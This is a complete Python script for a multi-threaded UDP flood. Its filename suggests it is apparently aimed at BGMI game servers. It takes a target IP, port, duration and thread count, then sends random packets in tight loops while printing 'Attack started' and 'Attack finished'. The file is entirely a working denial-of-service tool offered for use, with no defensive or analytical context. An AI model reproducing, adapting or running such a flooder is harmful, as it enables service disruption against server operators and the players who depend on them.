import socket
import threading
import time
import signal
import sys
import random

PAYLOAD_SIZE = 20

class Attack:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration

    def generate_payload(self):
        payload = bytearray()
        for _ in range(PAYLOAD_SIZE):
            payload.extend(b'\\x')
            payload.append(random.choice(b'0123456789abcdef'))
            payload.append(random.choice(b'0123456789abcdef'))
        return payload

    def attack_thread(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_addr = (self.ip, self.port)
        endtime = time.time() + self.duration
        payload = self.generate_payload()

        while time.time() <= endtime:
            try:
                sock.sendto(payload, server_addr)
            except Exception as e:
                print(f"Send failed: {e}")
                sock.close()
                return

        sock.close()

def handle_sigint(sig, frame):
    print("\nStopping attack...")
    sys.exit(0)

def usage():
    print("Usage: python bgmi.py ip port duration threads")
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        usage()

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"Attack started on {ip}:{port} for {duration} seconds with {threads} threads")

    thread_ids = []
    attacks = []

    for i in range(threads):
        attack = Attack(ip, port, duration)
        attacks.append(attack)
        thread = threading.Thread(target=attack.attack_thread)
        thread.start()
        thread_ids.append(thread)
        print(f"Launched thread with ID: {thread.ident}")

    for thread in thread_ids:
        thread.join()

    print("Attack finished")
